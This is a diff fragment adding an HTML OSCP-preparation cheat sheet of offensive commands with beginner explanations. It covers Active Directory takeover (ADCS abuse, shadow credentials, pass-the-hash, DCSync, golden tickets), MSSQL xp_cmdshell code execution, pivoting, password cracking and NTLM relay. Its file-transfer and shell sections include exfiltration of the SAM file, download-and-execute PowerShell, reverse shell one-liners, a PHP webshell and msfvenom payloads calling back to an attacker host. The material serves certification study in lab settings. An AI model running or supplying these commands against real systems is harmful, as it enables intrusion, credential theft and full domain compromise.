+# Now request as ESC1
+
+# ── After getting cert → auth → hash → DA ────────────────────
+certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
+# Hash from output → PTH:
+psexec.py corp.local/Administrator@&lt;DC_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+secretsdump.py corp.local/Administrator@&lt;DC_IP&gt; -hashes :&lt;NTLM_HASH&gt;</code></pre>
+
+  <h3>Shadow Credentials Attack</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>If you have "GenericWrite" over a user or computer</strong> (BloodHound shows this as an edge), you can quietly add your own certificate-style key to that account, then use it to log in <em>as them</em> — without ever knowing or changing their password. It's a stealthy takeover of any account you have write access to.</p>
+  </div>
+
+  <pre data-lang="bash"><code># Requires: GenericWrite on target user/computer
+# Check in BloodHound: GenericWrite edges on users or computers
+
+# Add shadow credential to target:
+pywhisker.py -d corp.local -u stephanie -p 'Password123' \
+    --target targetuser --action add --dc-ip 192.168.x.100
+# Gets: pfx file + password
+
+# Authenticate with pfx → get NTLM hash:
+certipy auth -pfx targetuser.pfx -dc-ip 192.168.x.100
+# NTLM hash → PTH or crack → lateral movement</code></pre>
+
+  <h3>AS-REP Roast — Unauthenticated (No Creds Needed)</h3>
+  <pre data-lang="bash"><code># Enumerate users first via RID brute (no creds):
+lookupsid.py corp.local/guest@192.168.x.100 -no-pass 2&gt;/dev/null | grep "SidTypeUser"
+# Or kerbrute:
+kerbrute userenum -d corp.local --dc 192.168.x.100 \
+    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Then AS-REP roast without creds:
+GetNPUsers.py corp.local/ -no-pass -usersfile domain_users.txt \
+    -dc-ip 192.168.x.100 -format hashcat
+hashcat -m 18200 asrep.txt rockyou.txt</code></pre>
+
+  <h3>LDAP — Extended Field Enumeration</h3>
+  <pre data-lang="bash"><code># Check description AND info AND comment fields (all can have passwords):
+ldapsearch -x -H ldap://192.168.x.100 \
+    -D "stephanie@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" \
+    "(objectClass=user)" sAMAccountName description info comment
+
+# Also check computer accounts for descriptions:
+ldapsearch -x -H ldap://192.168.x.100 \
+    -D "stephanie@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" \
+    "(objectClass=computer)" name description</code></pre>
+
+  <h3>MS01 → MS02 — When PTH Fails (Fallback Chain)</h3>
+  <div class="tree-box"><span class="root">PTH to MS02 failed?</span>
+        │
+        ▼
+<span class="leaf">Try in this order:</span>
+1. Kerberoast from MS01 context → crack → try new creds on MS02
+2. MSSQL on MS01 linked to MS02 → xp_cmdshell on MS02 (Section 6)
+3. PS history on MS01 → C:\Users\*\AppData\...\ConsoleHost_history.txt
+4. web.config / app.config on MS01 → DB creds → reuse on MS02
+5. BloodHound: MS01 machine account GenericAll on MS02?
+6. Unconstrained delegation on MS01 → coerce DC → TGT → DCSync
+7. ADCS ESC1/ESC8 → cert as MS02 admin → authenticate
+8. Password spray with ALL found creds/hashes on MS02 services</div>
+
+  <h3>Credential Spray — Across All Services (Chain)</h3>
+  <div class="callout green">
+    <strong>Rule:</strong> Every credential found anywhere must be tried on every service everywhere. Password reuse wins OSCP.
+  </div>
+  <pre data-lang="bash"><code># Any creds found → spray everything:
+nxc smb 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc winrm 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc mssql 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc rdp 192.168.x.0/24 -u user -p pass --continue-on-success
+nxc ssh 192.168.x.0/24 -u user -p pass --continue-on-success
+
+# After getting any hash → spray hash across subnet:
+nxc smb 192.168.x.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
+    --local-auth --continue-on-success | grep "+"</code></pre>
+
+  <h3>ADCS + AD Attack Decision Tree</h3>
+  <div class="tree-box"><span class="root">Run certipy find immediately with provided creds</span>
+        │
+    ┌───┴──────────────────────┐
+Vulnerable template found?    No ADCS vuln
+    │                              │
+    ▼                         Continue normal AD path
+<span class="leaf">ESC1 → certipy req -upn Administrator</span>
+    │
+    ▼
+<span class="leaf">certipy auth → NTLM hash</span>
+    │
+    ▼
+<span class="win">PTH as Administrator → Domain Admin ✓</span>
+
+ESC8 (HTTP endpoint)?
+→ certipy relay + PetitPotam coerce
+→ DC cert → DCSync → ALL hashes → Golden Ticket</div>
+
+  <h3>Pass-the-Ticket</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>Remember the Kerberos "wristband" ticket?</strong> If you land on a machine where a privileged user left a ticket sitting in memory, you can steal it and reuse it to access whatever they could — no password needed. <code>triage</code>/<code>dump</code> grab the tickets; <code>ptt</code> ("pass the ticket") injects one into your session so you effectively become that user.</p>
+  </div>
+
+  <pre data-lang="bash"><code># Windows (Rubeus):
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:&lt;LUID&gt; /service:krbtgt /nowrap
+.\Rubeus.exe ptt /ticket:&lt;BASE64_TICKET&gt;
+dir \\&lt;TARGET_FQDN&gt;\C$
+
+# Linux:
+export KRB5CCNAME=/tmp/ticket.ccache
+psexec.py -k -no-pass corp.local/administrator@&lt;TARGET_FQDN&gt;</code></pre>
+
+  <h3>Overpass-the-Hash</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>The bridge between the two login worlds.</strong> If you hold an NTLM <em>hash</em> but the target only accepts <em>Kerberos</em>, Overpass-the-Hash converts that hash into a fresh Kerberos ticket (TGT) so you can use ticket-based tools to move laterally. Reach for it when plain Pass-the-Hash is blocked but Kerberos is allowed.</p>
+  </div>
+
+  <pre data-lang="bash"><code># NTLM hash → Kerberos TGT:
+.\Rubeus.exe asktgt /user:user /rc4:&lt;NTLM_HASH&gt; /domain:corp.local /ptt
+
+# Linux:
+getTGT.py corp.local/user -hashes :&lt;NTLM_HASH&gt; -dc-ip 192.168.x.100
+export KRB5CCNAME=user.ccache
+psexec.py -k -no-pass corp.local/user@&lt;TARGET_FQDN&gt;</code></pre>
+
+  <h3>Lateral Movement — Pass-the-Hash</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>On Windows you often don't need to crack a hash — you can log in with the hash itself.</strong> Once you've dumped an Administrator NTLM hash, feed it to <code>psexec</code> / <code>wmiexec</code> / <code>evil-winrm</code> to get a shell on any machine that account is admin on. Always spray the hash across the whole subnet first (<code>nxc ... --continue-on-success</code>) to find every box it unlocks.</p>
+  </div>
+
+  <pre data-lang="bash"><code># Verify hash:
+nxc smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt; --local-auth
+
+# Spray hash across subnet:
+nxc smb 10.10.10.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
+    --local-auth --continue-on-success | grep "+"
+
+# Get shell:
+psexec.py corp.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+wmiexec.py corp.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+
+  <h3>DCSync Attack</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>Domain Controllers replicate their password database to each other.</strong> DCSync abuses that: if your account has replication rights (you earn them via ACL abuse, ADCS, or after reaching DA), you pretend to be a DC and politely ask the real DC for everyone's password hashes — including <code>krbtgt</code> and Administrator. It's the standard way to "dump the whole domain" without touching the DC's disk. Grabbing <code>krbtgt</code> here also sets up the Golden Ticket below.</p>
+  </div>
+
+  <pre data-lang="bash"><code>secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
+secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
+secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator
+
+# Mimikatz:
+lsadump::dcsync /user:krbtgt /domain:corp.local
+lsadump::dcsync /all /domain:corp.local</code></pre>
+
+  <h3>ACL Abuse — Common BloodHound Paths</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What ACLs are — and the rights to hunt for</span>
+    <p><strong>An ACL is the list of "who is allowed to do what" to an AD object.</strong> Admins misconfigure these constantly, and BloodHound draws each one as an arrow between accounts. Each right is its own attack: <strong>GenericAll</strong> = full control (reset their password, or add yourself to a group). <strong>WriteDACL</strong> = you can grant yourself <em>more</em> rights, including DCSync. <strong>GenericWrite</strong> = enough for Shadow Credentials or targeted Kerberoasting. <strong>GenericAll on a computer</strong> = set up RBCD to impersonate its admin. The commands below map one-to-one to those BloodHound edges.</p>
+  </div>
+
+  <pre data-lang="bash"><code># GenericAll on User → force password reset:
+Set-DomainUserPassword -Identity targetuser \
+    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)
+
+# GenericAll on Group → add to Domain Admins:
+Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
+
+# WriteDACL on Domain → grant DCSync rights:
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
+    -PrincipalIdentity stephanie -Rights DCSync
+# → now run secretsdump
+
+# GenericAll on Computer → RBCD Attack:
+addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
+    'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
+rbcd.py -delegate-to &lt;TARGET_COMPUTER&gt;$ -delegate-from ATTACKPC$ \
+    -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
+getST.py -spn cifs/&lt;TARGET_FQDN&gt; -impersonate Administrator \
+    'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
+export KRB5CCNAME=Administrator@cifs_&lt;TARGET_FQDN&gt;@CORP.LOCAL.ccache
+psexec.py -k -no-pass corp.local/Administrator@&lt;TARGET_FQDN&gt;</code></pre>
+
+  <h3>Golden Ticket</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>The <code>krbtgt</code> account's hash is the master key that signs every Kerberos ticket in the domain.</strong> Once you've dumped it (via DCSync), you can forge a "Golden Ticket" — a ticket claiming to be <em>anyone</em>, including a Domain Admin, valid for years. It's mainly a persistence trick; on the exam you'll usually already own the DC by this point, but it proves total, lasting control of the domain.</p>
+  </div>
+
+  <pre data-lang="bash"><code># Requirements: krbtgt NTLM hash + Domain SID
+ticketer.py -nthash &lt;KRBTGT_NTLM_HASH&gt; \
+    -domain-sid S-1-5-21-XXX-XXX-XXX \
+    -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass corp.local/Administrator@&lt;DC_FQDN&gt;</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S6 ═══════════════════ -->
+<section class="section" id="s6">
+  <div class="section-header">
+    <span class="section-num">06</span>
+    <h2>MSSQL — RCE &amp; Lateral Movement</h2>
+  </div>
+
+  <div class="callout">
+    MSSQL is a <strong>major OSCP attack path</strong>: initial RCE via xp_cmdshell, lateral movement via linked servers, hash capture via UNC injection, privesc via impersonation.
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">What's happening here</span>
+    <p><strong>MSSQL is Microsoft's database server (port 1433) — but it can run operating-system commands.</strong> If you get in as a privileged DB user (often <code>sa</code>), you can switch on a feature called <code>xp_cmdshell</code> that runs Windows commands <em>as the database service account</em> — instant code execution.</p>
+    <p><strong>How you usually get in:</strong> default/blank <code>sa</code> password, creds found in a web app's <code>web.config</code>, or a SQL injection that reaches the DB. Once inside, the steps below are a recipe: connect → enumerate → enable xp_cmdshell → shell. Even if you're not <code>sa</code>, the <em>impersonation</em> trick (Step 4) can promote you.</p>
+  </div>
+
+  <h3>Step 1: Connect</h3>
+  <pre data-lang="bash"><code>mssqlclient.py corp.local/sa@&lt;TARGET_IP&gt; -windows-auth
+mssqlclient.py sa@&lt;TARGET_IP&gt;
+mssqlclient.py corp.local/user:'pass'@&lt;TARGET_IP&gt; -windows-auth</code></pre>
+
+  <h3>Step 2: Enumerate</h3>
+  <pre data-lang="sql"><code>SELECT @@version;
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = sysadmin!
+SELECT name FROM master.dbo.sysdatabases;
+
+-- Check impersonation rights:
+SELECT distinct b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+-- Linked servers:
+EXEC sp_linkedservers;
+SELECT srvname, isremote FROM master..sysservers;</code></pre>
+
+  <h3>Step 3: Enable xp_cmdshell → RCE</h3>
+  <pre data-lang="sql"><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -nop -w hidden -enc &lt;BASE64_PAYLOAD&gt;';
+EXEC xp_cmdshell 'net user hax P@ss123! /add &amp;&amp; net localgroup administrators hax /add';</code></pre>
+
+  <h3>Step 4: Impersonation (non-sysadmin → sysadmin)</h3>
+  <pre data-lang="sql"><code>EXECUTE AS LOGIN = 'sa';
+SELECT IS_SRVROLEMEMBER('sysadmin');   -- Should return 1
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</code></pre>
+
+  <h3>Step 5: Linked Server Lateral Movement</h3>
+  <pre data-lang="sql"><code>-- Single hop (MS01 → MS02):
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT @@version, SYSTEM_USER');
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-- Execute on linked server:
+EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
+
+-- Enable + RCE on linked server:
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
+EXEC ('xp_cmdshell ''powershell -enc &lt;BASE64&gt;''') AT [MS02\SQLEXPRESS];
+
+-- Double hop (MS01 → MS02 → MS03):
+EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];</code></pre>
+
+  <h3>Step 6: UNC Path Injection → Hash Capture</h3>
+  <pre data-lang="bash"><code># Setup Responder:
+sudo responder -I tun0 -wv
+
+# In MSSQL — trigger UNC auth:
+EXEC xp_dirtree '\\&lt;LHOST&gt;\share';
+EXEC xp_fileexist '\\&lt;LHOST&gt;\share\file';
+
+# Crack captured NetNTLMv2:
+hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt
+
+# NTLM Relay (if SMB signing off):
+sudo python3 ntlmrelayx.py -t smb://&lt;TARGET_IP&gt; -smb2support</code></pre>
+
+  <h3>MSSQL Attack Decision Tree</h3>
+  <div class="tree-box"><span class="root">MSSQL Found (port 1433)</span>
+        │
+Try creds: sa:(blank) / sa:sa / sa:password / domain_user:known_pass
+        │
+    ┌───┴──────────┐
+ Sysadmin?      Not sysadmin?
+    │               │
+    │         Check IMPERSONATE rights
+    │         → EXECUTE AS LOGIN='sa'
+    │               │
+    └───────────────┘
+        │
+<span class="leaf">Enable xp_cmdshell → RCE on current server</span>
+        │
+Check linked servers (sp_linkedservers)
+        │
+    ┌───┴─────────────────────────────┐
+No links                       <span class="leaf">Links found</span>
+    │                                │
+    │                        xp_cmdshell on linked
+    │                        → Shell on MS02/DC
+    │
+<span class="note">UNC injection → Responder → crack NetNTLMv2</span></div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S7 ═══════════════════ -->
+<section class="section" id="s7">
+  <div class="section-header">
+    <span class="section-num">07</span>
+    <h2>Pivoting &amp; Tunneling</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Why this matters</span>
+    <p><strong>Pivoting = using a machine you own as a stepping stone to reach machines you can't see.</strong> In the AD set, you can reach MS01 directly — but MS02 and the DC sit on an internal network your Kali box has no route to. MS01 <em>can</em> talk to them, so you turn MS01 into a tunnel and route your tools <em>through</em> it.</p>
+    <p><strong>Simple analogy:</strong> you can't enter a locked office building, but you've befriended someone inside who passes your messages back and forth. That insider is your pivot.</p>
+    <p><strong>For OSCP, learn one tool well — Ligolo-ng.</strong> It's the simplest: start the proxy on Kali, run the agent on MS01, and suddenly the internal subnet behaves like it's directly reachable. Don't drown in five different tools; master Ligolo and keep Chisel/SSH as backups.</p>
+  </div>
+
+  <h3>Ligolo-ng (Recommended for OSCP)</h3>
+  <pre data-lang="bash"><code># 1. Attacker: create tun interface + start proxy:
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# 2. Transfer agent to MS01 → connect:
+# Windows:
+certutil -urlcache -split -f http://&lt;LHOST&gt;/agent.exe agent.exe
+.\agent.exe -connect &lt;LHOST&gt;:11601 -ignore-cert
+
+# 3. In ligolo proxy console:
+session; ifconfig; start
+
+# 4. Add route to internal network:
+sudo ip route add 10.10.10.0/24 dev ligolo
+# Now attack MS02 directly!
+nmap -sV 10.10.10.50
+evil-winrm -i 10.10.10.50 -u user -p pass
+
+# Expose internal port via listener:
+listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp</code></pre>
+
+  <h3>Ligolo-ng Double Pivot (MS01 → MS02 → MS03)</h3>
+  <pre data-lang="bash"><code># After shell on MS02, expose ligolo port via listener on MS01:
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+# On MS02:
+.\agent.exe -connect &lt;MS01_IP&gt;:11601 -ignore-cert
+# New session appears in proxy → start → add route:
+sudo ip route add 172.16.0.0/24 dev ligolo</code></pre>
+
+  <h3>Plink (Windows — no SSH client)</h3>
+  <pre data-lang="bash"><code>certutil -urlcache -split -f http://&lt;LHOST&gt;/plink.exe plink.exe
+cmd /c echo y | .\plink.exe -ssh -l root -pw &lt;SSH_PASS&gt; \
+    -R 127.0.0.1:4455:127.0.0.1:445 &lt;LHOST&gt;
+# Attacker's 4455 → victim's 445</code></pre>
+
+  <h3>Chisel</h3>
+  <pre data-lang="bash"><code># Attacker:
+./chisel server -p 8888 --reverse
+
+# Victim:
+.\chisel.exe client &lt;LHOST&gt;:8888 R:socks
+# /etc/proxychains4.conf: socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 10.10.10.50
+proxychains evil-winrm -i 10.10.10.50 -u user -p pass</code></pre>
+
+  <h3>SSH Tunneling</h3>
+  <pre data-lang="bash"><code># Local port forward:
+ssh -L 3389:10.10.10.50:3389 user@&lt;MS01_IP&gt;
+xfreerdp /v:localhost:3389 /u:user /p:pass
+
+# Dynamic SOCKS:
+ssh -D 1080 -N user@&lt;MS01_IP&gt;
+proxychains nmap -sT -Pn 10.10.10.0/24</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S8 ═══════════════════ -->
+<section class="section" id="s8">
+  <div class="section-header">
+    <span class="section-num">08</span>
+    <h2>Password Attacks</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Concept first</span>
+    <p><strong>Systems never store your real password — they store a <em>hash</em>:</strong> a scrambled, one-way fingerprint of it. "Cracking" means guessing passwords, hashing each guess, and checking if it matches the stolen hash. You're not reversing the hash; you're racing through millions of guesses.</p>
+    <p><strong>Two situations, two approaches:</strong> if you have a <em>stolen hash</em> → crack it offline with <code>hashcat</code>/<code>john</code> (fast, silent, no lockouts). If you have a <em>login form / service</em> and no hash → brute-force online with <code>hydra</code> (slower, noisy, can lock accounts — use sparingly).</p>
+    <p><strong>The first step is always identifying the hash type</strong> so you pick the right hashcat mode. <code>rockyou.txt</code> is your go-to wordlist; for OSCP you rarely need anything fancier.</p>
+  </div>
+
+  <h3>Hashcat Modes Reference</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Mode</th><th>Hash Type</th><th>Use Case</th></tr></thead>
+      <tbody>
+        <tr><td>1000</td><td>NTLM</td><td>Windows local hashes</td></tr>
+        <tr><td>5600</td><td>NetNTLMv2</td><td>Responder captures</td></tr>
+        <tr><td>5500</td><td>NetNTLMv1</td><td>Older captures</td></tr>
+        <tr><td>13100</td><td>Kerberoast TGS-REP</td><td>SPN hash crack</td></tr>
+        <tr><td>18200</td><td>AS-REP Roast</td><td>AS-REP hash crack</td></tr>
+        <tr><td>1800</td><td>SHA512crypt $6$</td><td>Linux /etc/shadow</td></tr>
+        <tr><td>500</td><td>MD5crypt $1$</td><td>Linux shadow (older)</td></tr>
+        <tr><td>3200</td><td>bcrypt $2y$</td><td>Modern Linux/web</td></tr>
+        <tr><td>0</td><td>MD5</td><td>Web app hashes</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <pre data-lang="bash"><code>hashcat -m 1000 ntlm.txt rockyou.txt
+hashcat -m 5600 netntlm.txt rockyou.txt
+hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule
+hashcat -m 18200 asrep.txt rockyou.txt
+hashcat -m 1800 shadow.txt rockyou.txt</code></pre>
+
+  <h3>NTLM Capture &amp; Relay</h3>
+  <pre data-lang="bash"><code># Capture (Responder):
+sudo responder -I tun0 -wv
+hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
+
+# Check signing:
+nxc smb &lt;SUBNET&gt;/24 -u '' -p '' --gen-relay-list unsigned.txt
+
+# Relay:
+sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
+# Trigger auth via UNC, link, etc. → SAM dump or shell</code></pre>
+
+  <h3>Online Brute Force</h3>
+  <pre data-lang="bash"><code># SSH:
+hydra -l root -P rockyou.txt ssh://&lt;TARGET_IP&gt; -t 4
+
+# HTTP POST:
+hydra -l admin -P rockyou.txt &lt;TARGET_IP&gt; http-post-form \
+    "/login.php:username=^USER^&amp;password=^PASS^:Invalid"
+
+# SMB spray (check lockout first!):
+nxc smb &lt;TARGET_IP&gt; -u stephanie -p 'Password123' --pass-pol
+nxc smb &lt;TARGET_IP&gt; -u domain_users.txt -p 'Password123' --continue-on-success</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S9 ═══════════════════ -->
+<section class="section" id="s9">
+  <div class="section-header">
+    <span class="section-num">09</span>
+    <h2>File Transfer Cheatsheet</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Why you'll need this constantly</span>
+    <p><strong>After getting a shell, you'll always need to move files</strong> — pushing your enumeration scripts (linpeas, winPEAS) <em>to</em> the target, and pulling loot (hashes, configs) <em>back</em> to Kali. The target rarely has internet, so you host the file on your own machine and have the target fetch it.</p>
+    <p><strong>The standard pattern:</strong> on Kali, start a quick web server in the folder with your file — <code>python3 -m http.server 80</code> — then on the target use whatever download tool exists (<code>wget</code>, <code>curl</code>, <code>certutil</code>, PowerShell). The commands below cover every OS combination. Pick the one that matches your shell.</p>
+  </div>
+
+  <h3>Linux → Windows</h3>
+  <pre data-lang="powershell"><code># PowerShell:
+IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/shell.ps1')
+(New-Object Net.WebClient).DownloadFile('http://&lt;LHOST&gt;/file.exe','C:\Temp\file.exe')
+Invoke-WebRequest -Uri http://&lt;LHOST&gt;/file.exe -OutFile C:\Temp\file.exe
+
+# Certutil:
+certutil -urlcache -split -f http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
+
+# BITS:
+bitsadmin /transfer job /download /priority normal http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
+
+# SMB (setup on attacker):
+impacket-smbserver share . -smb2support
+copy \\&lt;LHOST&gt;\share\file.exe C:\Temp\</code></pre>
+
+  <h3>Windows → Linux (Exfil)</h3>
+  <pre data-lang="powershell"><code># Via SMB:
+copy C:\Windows\System32\config\SAM \\&lt;LHOST&gt;\share\SAM
+
+# Base64 encode → copy/paste:
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
+# Decode on attacker:
+echo '&lt;BASE64&gt;' | base64 -d &gt; file.txt</code></pre>
+
+  <h3>Linux → Linux</h3>
+  <pre data-lang="bash"><code>python3 -m http.server 80
+wget http://&lt;LHOST&gt;/file; curl http://&lt;LHOST&gt;/file -o file
+scp file.txt user@&lt;TARGET_IP&gt;:/tmp/
+# Netcat:
+nc -lvnp 4444 &gt; file          # receiver
+nc &lt;IP&gt; 4444 &lt; file           # sender
+# Base64:
+base64 -w0 file.exe; echo '&lt;B64&gt;' | base64 -d &gt; file.exe</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S10 ═══════════════════ -->
+<section class="section" id="s10">
+  <div class="section-header">
+    <span class="section-num">10</span>
+    <h2>Shells &amp; Upgrades</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Concept first</span>
+    <p><strong>A reverse shell makes the <em>target</em> connect back to <em>you</em>.</strong> You start a listener on Kali (<code>nc -lvnp 4444</code>), then trick the target into running a one-liner that dials home to your IP and port. This works even through firewalls, which is why it's the default — a <em>bind</em> shell (where you connect to the target) usually gets blocked by inbound filtering.</p>
+    <p><strong>Always upgrade your shell.</strong> The first shell you get is "dumb" — no arrow keys, no tab-complete, and <kbd>Ctrl-C</kbd> kills it. Upgrading to a full TTY (the <code>python3 pty</code> trick below) makes it behave like a real terminal so you can use <code>sudo</code>, text editors, and SSH. <em>Do this immediately every time.</em></p>
+  </div>
+
+  <h3>Reverse Shell One-Liners</h3>
+  <pre data-lang="bash"><code># Bash:
+bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1
+
+# Python3:
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;LHOST&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PHP webshell:
+&lt;?php system($_GET["cmd"]); ?&gt;
+
+# Netcat (mkfifo):
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f
+
+# msfvenom payloads:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f war -o shell.war</code></pre>
+
+  <h3>Shell Upgrade — Linux TTY</h3>
+  <pre data-lang="bash"><code># Method 1: Python PTY (most reliable)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm; stty rows 48 columns 190
+
+# Method 2: Script
+script /dev/null -c bash
+# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+
+# Method 3: Socat (best quality)
+# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:4444</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S11 ═══════════════════ -->
+<section class="section" id="s11">
+  <div class="section-header">
+    <span class="section-num">11</span>
+    <h2>Common CVEs &amp; Exploits</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">How to use public exploits</span>
+    <p><strong>A CVE is a known, catalogued vulnerability.</strong> Once you've identified the exact software <em>and version</em> on a target, search for a matching exploit: <code>searchsploit &lt;software&gt;</code> locally, or Exploit-DB / GitHub online. The table below is a shortlist of CVEs that show up most often in OSCP-style boxes.</p>
+    <p><strong>⚠ Never run a downloaded exploit blindly.</strong> Read the code first — confirm it targets your exact version, edit the IP/port variables, and understand what it does. Random "auto-pwn" scripts can crash the box or do nothing. Verify the version matches; a Windows 7 exploit won't work on Server 2019.</p>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>CVE / Exploit</th><th>Target</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>MS17-010 EternalBlue</td><td>Win7/2008 R2 (SMB v1)</td><td><span class="impact">→ SYSTEM</span></td></tr>
+        <tr><td>CVE-2019-0708 BlueKeep</td><td>Win7/2008 RDP</td><td><span class="impact">→ RCE/SYSTEM</span></td></tr>
+        <tr><td>CVE-2021-41773</td><td>Apache 2.4.49 PATH traversal</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2021-3156 Baron Samedit</td><td>sudo &lt; 1.9.5p2</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2021-4034 PwnKit</td><td>pkexec all distros</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2022-0847 DirtyPipe</td><td>kernel 5.8–5.16.11</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2016-5195 DirtyCow</td><td>kernel &lt; 4.8.3</td><td><span class="impact">→ local root</span></td></tr>
+        <tr><td>CVE-2021-44228 Log4Shell</td><td>Log4j 2.x Java</td><td><span class="impact">→ RCE</span></td></tr>
+        <tr><td>CVE-2021-1675 PrintNightmare</td><td>Win2019/10</td><td><span class="impact">→ SYSTEM/RCE</span></td></tr>
